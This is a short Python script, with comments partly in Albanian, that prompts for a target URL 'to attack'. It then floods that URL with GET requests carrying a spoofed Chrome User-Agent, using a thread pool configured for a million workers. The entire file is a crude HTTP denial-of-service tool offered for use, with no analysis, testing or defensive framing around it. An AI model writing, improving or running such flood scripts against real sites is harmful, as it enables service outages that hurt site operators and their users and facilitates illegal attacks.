import requests
from concurrent.futures import ThreadPoolExecutor

url = input("Enter URL with Protocol to attack (like: http://example.com) : ") 

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

def attack(url):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        response.raise_for_status()  # nese ka error kthen req
        return f"Success: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"

MAX_THREADS = 1000000  # count per req

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    futures = [executor.submit(attack, url) for _ in range(MAX_THREADS)]

    for future in futures:
        print(future.result())
